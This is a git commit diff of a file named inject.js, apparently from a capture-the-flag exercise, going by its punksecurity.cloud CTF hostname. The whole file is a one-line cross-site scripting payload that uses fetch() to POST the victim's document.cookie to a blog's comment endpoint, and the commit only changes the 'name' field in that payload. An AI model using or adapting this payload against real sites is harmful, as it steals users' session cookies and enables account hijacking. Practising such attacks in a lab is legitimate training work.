30fa56f5e38b48e325035da32882d626dad8f9d3
Panagiotis Vasilikos <94691274+panagiotisvasilikos@users.noreply.github.com>
2023-05-05 00:50:26 +0200

    Update inject.js

--- inject.js
+++ inject.js
@@ -1,2 +1,2 @@
-fetch('http://blog.99014fee-590.ctf.one.dr.punksecurity.cloud:5000/new-comment', {method: 'POST', mode: 'no-cors', body:"name=gotyou&comment=hello"+document.cookie}); 
+fetch('http://blog.99014fee-590.ctf.one.dr.punksecurity.cloud:5000/new-comment', {method: 'POST', mode: 'no-cors', body:"name=gotyou+&comment=hello"+document.cookie}); 
 
